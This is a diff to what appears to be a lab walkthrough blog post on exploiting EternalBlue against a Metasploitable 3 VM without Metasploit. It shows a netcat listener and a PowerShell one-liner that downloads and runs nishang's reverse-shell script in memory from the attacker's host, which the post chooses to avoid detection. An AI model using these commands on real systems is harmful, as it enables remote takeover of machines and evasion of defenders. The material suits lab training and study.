@@ -12,7 +12,7 @@ I wanted to create a Without Metasploit series. Here we would look and modify fa
 <h3> Environment </h3>
 The easiest way to find an environment to test on, is to get Hack The Box VIP and attack Blue.
 Setting up your lockal vm, try Metasploitable 3 [Metasploitable3](https://github.com/rapid7/metasploitable3) 
-I will go with the Metasploitable now.
+I will go with the Metasploitable now. For the EternalBlue to work I had to thisable the firewall on metasploitable3.
 Metasploitable ip: 10.0.2.15
 
 Attacker
@@ -97,6 +97,23 @@ First let's start a listener on our attacker machine then execute our code.
 ```nc-lvnp 443```
 [UploadExploit](/img/EternalBlue/uploadExploit.PNG)
 We can see that the exploit run and we got back a reverse shell as System.
+
+<h3>To memory</h3>
+We got what we wanted. But this is not the best case. We created a file in the system which is detectable. Let's find a better way. We saw that we can execute commands.
+With the use of Powershell, we can download things on the machine and executing them while everything will be done in memory.
+Let's download the famous nishang powershell shell
+```wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1```
+Now we have to modify this a little bit. to inmidiatly invoke the reverse shell we should add this line to the end of the file:
+```Invoke-PowerShellTcp -Reverse -IPAddress 10.0.2.4 -Port 443```
+This way when the file gets downloaded with powershell, we will immidiately call the main function with our ip address and port to connect back to. I also renamed the file to test.ps1
+Next we need to download the file with our exploit. For this we only need one line in our function.
+```service_exec(conn, r"cmd /c powershell iex(new-object net.webclient).downloadstring('http://10.0.2.4/test.ps1')")```
+Here we spawn cmd and from there we will call powershell to download and execute the ps1 script that is hosted in our machine. Notice that by adding the extra line to the script, we just need to download the file to get a revers shell.
+Finaly we need to host the script somehow. For this go into the folder where the test.ps1 is located and create a http server. For example with:
+```python -m SimpleHTTPServer 80```
+We will need 3 command window for this to work. one to host our server, one for the listener and one which will execute theexploit itself.
+[InvokeExploit](/img/EternalBlue/invoke.PNG)
+We can see it worked. pulled the file from our server and we got the reverse shell back.
 <br>
 
 
